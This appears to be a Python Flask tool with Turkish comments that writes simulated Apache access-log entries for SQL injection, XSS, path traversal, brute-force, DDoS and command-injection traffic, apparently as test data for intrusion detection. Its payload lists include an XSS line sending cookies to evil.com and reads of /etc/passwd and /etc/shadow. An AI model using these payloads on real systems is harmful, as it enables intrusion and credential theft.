import os
import time
import random
import string
import socket
import logging
import ipaddress
import requests
from datetime import datetime
from flask import Flask, render_template, request, jsonify, redirect, url_for
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # CORS desteği ekle

# Port numarası
PORT = 5002

# Log dosya yolu
ACCESS_LOG = "access.log"

# Rastgele IP adresleri
def generate_random_ips(count=10):
    """Rastgele IP adresleri üretir"""
    ips = []
    for _ in range(count):
        # Gerçekçi IP adresleri üret (özel IP aralıklarını dışarıda bırak)
        while True:
            octet1 = random.randint(1, 255)
            # RFC 1918 özel IP adreslerini dışarıda bırak
            if octet1 not in [10, 127, 169, 172, 192]:
                break
        
        octet2 = random.randint(0, 255)
        octet3 = random.randint(0, 255)
        octet4 = random.randint(1, 254)  # 0 ve 255 broadcast adreslerini dışarıda bırak
        
        ip = f"{octet1}.{octet2}.{octet3}.{octet4}"
        ips.append(ip)
    
    return ips

# Önceden tanımlanmış IP'ler
PREDEFINED_IPS = generate_random_ips(20)

# Saldırı örnekleri
SQL_INJECTION_PAYLOADS = [
    "' OR 1=1 --",
    "' UNION SELECT username, password FROM users --",
    "admin'; DROP TABLE users; --",
    "1'; SELECT * FROM information_schema.tables; --",
    "' OR '1'='1",
    "'; EXEC xp_cmdshell('net user'); --",
    "' OR 1=1 LIMIT 1; --",
    "' AND 1=0 UNION SELECT null, table_name FROM information_schema.tables; --",
    "' UNION ALL SELECT null, @@version; --",
    "' OR EXISTS(SELECT 1 FROM users WHERE username='admin'); --"
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(\"XSS\")'>",
    "<body onload='alert(\"XSS\")'>",
    "<svg onload='alert(\"XSS\")'>",
    "javascript:alert('XSS')",
    "<iframe src='javascript:alert(`XSS`)'>",
    "<div style='background-image:url(javascript:alert(\"XSS\"))'>",
    "<input onfocus='alert(\"XSS\")' autofocus>",
    "<a href='javascript:alert(\"XSS\")'>Click me</a>",
    "<script>fetch('https://evil.com/'+document.cookie)</script>"
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../Windows/system.ini",
    "../../../../boot.ini",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "../../etc/passwd%00",
    "/var/www/../../etc/passwd",
    "../../../../etc/hosts",
    "..\\..\\..\\Windows\\win.ini"
]

BRUTE_FORCE_PAYLOADS = [
    {"username": "admin", "password": "password"},
    {"username": "admin", "password": "admin123"},
    {"username": "administrator", "password": "P@ssw0rd"},
    {"username": "root", "password": "toor"},
    {"username": "superuser", "password": "superuser123"},
    {"username": "user", "password": "123456"},
    {"username": "guest", "password": "guest"},
    {"username": "admin", "password": "admin"},
    {"username": "test", "password": "test"},
    {"username": "user1", "password": "pass123"}
]

DDOS_ENDPOINTS = [
    "/",
    "/login",
    "/api/data",
    "/admin",
    "/dashboard",
    "/users",
    "/products",
    "/cart",
    "/checkout",
    "/profile"
]

COMMAND_INJECTION_PAYLOADS = [
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "; ls -la",
    "& dir",
    "; uname -a",
    "| id",
    "& whoami",
    "; ping -c 4 127.0.0.1",
    "| grep root /etc/passwd",
    "& type C:\\Windows\\win.ini"
]

# HTTP yöntemleri
HTTP_METHODS = ["GET", "POST", "PUT", "DELETE"]
STATUS_CODES = {
    "success": [200, 201, 202, 204],
    "redirect": [301, 302, 303, 307, 308],
    "client_error": [400, 401, 403, 404, 405, 429],
    "server_error": [500, 501, 502, 503, 504]
}

# HTTP User-Agent'ları
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 OPR/78.0.4093.112"
]

# Bot User-Agent'ları
BOT_USER_AGENTS = [
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)",
    "Mozilla/5.0 (compatible; SemrushBot/3.0; +http://www.semrush.com/bot.html)",
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)",
    "Python-urllib/3.9"
]

def format_apache_log(ip, method, path, status_code, user_agent):
    """Apache Common Log Format biçiminde log satırı oluşturur"""
    now = datetime.now().strftime("%d/%b/%Y:%H:%M:%S +0300")
    size = random.randint(100, 10000)
    referer = "-"
    
    log_line = f'{ip} - - [{now}] "{method} {path} HTTP/1.1" {status_code} {size} "{referer}" "{user_agent}"'
    return log_line

def write_to_log(log_line):
    """Log dosyasına yazma işlemi"""
    try:
        with open(ACCESS_LOG, "a", encoding="utf-8") as f:
            f.write(log_line + "\n")
        return True
    except Exception as e:
        print(f"Log yazma hatası: {e}")
        return False

def generate_sql_injection_attack(ip, count=1):
    """SQL Injection saldırısı oluşturur"""
    results = []
    
    for _ in range(count):
        method = random.choice(["GET", "POST"])
        payload = random.choice(SQL_INJECTION_PAYLOADS)
        
        if method == "GET":
            path = f"/search?q={payload}"
        else:
            path = "/login"
        
        status_code = random.choice(STATUS_CODES["client_error"] + STATUS_CODES["server_error"])
        user_agent = random.choice(USER_AGENTS)
        
        log_line = format_apache_log(ip, method, path, status_code, user_agent)
        success = write_to_log(log_line)
        results.append({"success": success, "log": log_line})
    
    return results

def generate_xss_attack(ip, count=1):
    """XSS saldırısı oluşturur"""
    results = []
    
    for _ in range(count):
        method = random.choice(["GET", "POST"])
        payload = random.choice(XSS_PAYLOADS)
        
        if method == "GET":
            path = f"/page?content={payload}"
        else:
            path = "/comment"
        
        status_code = random.choice(STATUS_CODES["success"] + STATUS_CODES["client_error"])
        user_agent = random.choice(USER_AGENTS)
        
        log_line = format_apache_log(ip, method, path, status_code, user_agent)
        success = write_to_log(log_line)
        results.append({"success": success, "log": log_line})
    
    return results

def generate_path_traversal_attack(ip, count=1):
    """Path Traversal saldırısı oluşturur"""
    results = []
    
    for _ in range(count):
        method = "GET"
        payload = random.choice(PATH_TRAVERSAL_PAYLOADS)
        path = f"/download?file={payload}"
        
        status_code = random.choice(STATUS_CODES["client_error"] + STATUS_CODES["server_error"])
        user_agent = random.choice(USER_AGENTS)
        
        log_line = format_apache_log(ip, method, path, status_code, user_agent)
        success = write_to_log(log_line)
        results.append({"success": success, "log": log_line})
    
    return results

def generate_brute_force_attack(ip, count=1):
    """Brute Force saldırısı oluşturur"""
    results = []
    
    for _ in range(count):
        method = "POST"
        credentials = random.choice(BRUTE_FORCE_PAYLOADS)
        path = "/login"
        
        status_code = 401  # Unauthorized
        user_agent = random.choice(USER_AGENTS)
        
        log_line = format_apache_log(ip, method, path, status_code, user_agent)
        success = write_to_log(log_line)
        results.append({"success": success, "log": log_line})
    
    return results

def generate_ddos_attack(ip, count=1):
    """DDoS saldırısı oluşturur"""
    results = []
    
    for _ in range(count):
        method = random.choice(HTTP_METHODS)
        path = random.choice(DDOS_ENDPOINTS)
        
        status_code = random.choice(
            STATUS_CODES["success"] + 
            STATUS_CODES["client_error"] + 
            [429, 503]  # Rate limit ve service unavailable
        )
        
        user_agent = random.choice(USER_AGENTS)
        
        log_line = format_apache_log(ip, method, path, status_code, user_agent)
        success = write_to_log(log_line)
        results.append({"success": success, "log": log_line})
    
    return results

def generate_command_injection_attack(ip, count=1):
    """Command Injection saldırısı oluşturur"""
    results = []
    
    for _ in range(count):
        method = random.choice(["GET", "POST"])
        payload = random.choice(COMMAND_INJECTION_PAYLOADS)
        
        if method == "GET":
            path = f"/execute?cmd=ls{payload}"
        else:
            path = "/admin/execute"
        
        status_code = random.choice(STATUS_CODES["client_error"] + STATUS_CODES["server_error"])
        user_agent = random.choice(USER_AGENTS)
        
        log_line = format_apache_log(ip, method, path, status_code, user_agent)
        success = write_to_log(log_line)
        results.append({"success": success, "log": log_line})
    
    return results

def generate_bot_activity(ip, count=1):
    """Bot aktivitesi oluşturur"""
    results = []
    
    for _ in range(count):
        method = "GET"
        path = random.choice([
            "/", "/sitemap.xml", "/robots.txt", "/favicon.ico", 
            "/wp-login.php", "/admin", "/login", "/feed", 
            "/wp-content/uploads/", "/images/"
        ])
        
        status_code = random.choice(STATUS_CODES["success"] + [404])
        user_agent = random.choice(BOT_USER_AGENTS)
        
        log_line = format_apache_log(ip, method, path, status_code, user_agent)
        success = write_to_log(log_line)
        results.append({"success": success, "log": log_line})
    
    return results

def generate_multiple_fingerprints(ip, count=1):
    """Çoklu parmak izi aktivitesi oluşturur"""
    results = []
    
    # Her istek için farklı bir user agent kullan
    for _ in range(count):
        method = random.choice(HTTP_METHODS)
        path = random.choice(["/", "/products", "/about", "/contact", "/login"])
        
        status_code = random.choice(STATUS_CODES["success"])
        
        # Her seferinde farklı bir user agent seç
        user_agent = random.choice(USER_AGENTS)
        
        log_line = format_apache_log(ip, method, path, status_code, user_agent)
        success = write_to_log(log_line)
        results.append({"success": success, "log": log_line})
    
    return results

def generate_high_frequency(ip, count=1):
    """Yüksek frekans aktivitesi oluşturur"""
    results = []
    
    # Çok kısa süre içinde çok sayıda istek oluştur
    for _ in range(count):
        method = random.choice(HTTP_METHODS)
        path = random.choice(["/", "/api/data", "/products", "/search", "/users"])
        
        status_code = random.choice(STATUS_CODES["success"] + [429])  # Rate limit aşıldı
        user_agent = random.choice(USER_AGENTS)
        
        log_line = format_apache_log(ip, method, path, status_code, user_agent)
        success = write_to_log(log_line)
        results.append({"success": success, "log": log_line})
    
    return results

def generate_high_error_rate(ip, count=1):
    """Yüksek hata oranı aktivitesi oluşturur"""
    results = []
    
    for _ in range(count):
        method = random.choice(HTTP_METHODS)
        
        # Var olmayan sayfalara istek at
        random_path = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        path = f"/{random_path}"
        
        # Çoğunlukla 4xx hatası döndür
        status_code = random.choice([404, 400, 403, 405, 406, 410])
        user_agent = random.choice(USER_AGENTS)
        
        log_line = format_apache_log(ip, method, path, status_code, user_agent)
        success = write_to_log(log_line)
        results.append({"success": success, "log": log_line})
    
    return results

def get_local_ip():
    """Yerel IP adresini döndürür"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except:
        return "127.0.0.1"

@app.route('/')
def index():
    """Ana sayfa"""
    return render_template('attack.html', ips=PREDEFINED_IPS, local_ip=get_local_ip())

@app.route('/api/attack', methods=['POST'])
def attack():
    """Saldırı API'si"""
    data = request.json
    attack_type = data.get('attack_type')
    ip = data.get('ip')
    count = int(data.get('count', 1))
    
    # Maksimum sayıyı sınırla
    count = min(count, 50)
    
    if not ip or not attack_type:
        return jsonify({"success": False, "message": "IP adresi ve saldırı türü gerekli"})
    
    # Saldırı türüne göre ilgili fonksiyonu çağır
    attack_functions = {
        "sql_injection": generate_sql_injection_attack,
        "xss": generate_xss_attack,
        "path_traversal": generate_path_traversal_attack,
        "brute_force": generate_brute_force_attack,
        "ddos": generate_ddos_attack,
        "command_injection": generate_command_injection_attack,
        "bot_activity": generate_bot_activity,
        "multiple_fingerprints": generate_multiple_fingerprints,
        "high_frequency": generate_high_frequency,
        "high_error_rate": generate_high_error_rate
    }
    
    if attack_type in attack_functions:
        results = attack_functions[attack_type](ip, count)
        return jsonify({"success": True, "results": results})
    else:
        return jsonify({"success": False, "message": "Geçersiz saldırı türü"})

@app.route('/api/add-ip', methods=['POST'])
def add_ip():
    """Yeni IP ekle"""
    data = request.json
    ip = data.get('ip')
    
    if not ip:
        return jsonify({"success": False, "message": "IP adresi gerekli"})
    
    # IP formatı doğru mu kontrol et
    try:
        ipaddress.ip_address(ip)
    except ValueError:
        return jsonify({"success": False, "message": "Geçersiz IP adresi formatı"})
    
    # IP zaten listede mi kontrol et
    if ip in PREDEFINED_IPS:
        return jsonify({"success": False, "message": "Bu IP zaten listede"})
    
    # IP'yi listeye ekle
    PREDEFINED_IPS.append(ip)
    
    return jsonify({"success": True, "message": "IP başarıyla eklendi", "ips": PREDEFINED_IPS})

@app.route('/api/remove-ip', methods=['POST'])
def remove_ip():
    """IP sil"""
    data = request.json
    ip = data.get('ip')
    
    if not ip:
        return jsonify({"success": False, "message": "IP adresi gerekli"})
    
    # IP listede mi kontrol et
    if ip not in PREDEFINED_IPS:
        return jsonify({"success": False, "message": "Bu IP listede yok"})
    
    # IP'yi listeden çıkar
    PREDEFINED_IPS.remove(ip)
    
    return jsonify({"success": True, "message": "IP başarıyla silindi", "ips": PREDEFINED_IPS})

if __name__ == '__main__':
    # Log dosyasını oluştur
    if not os.path.exists(ACCESS_LOG):
        open(ACCESS_LOG, 'a').close()
    
    print(f"Saldırı simülatörü başlatılıyor... PORT: {PORT}")
    app.run(debug=True, host='0.0.0.0', port=PORT) 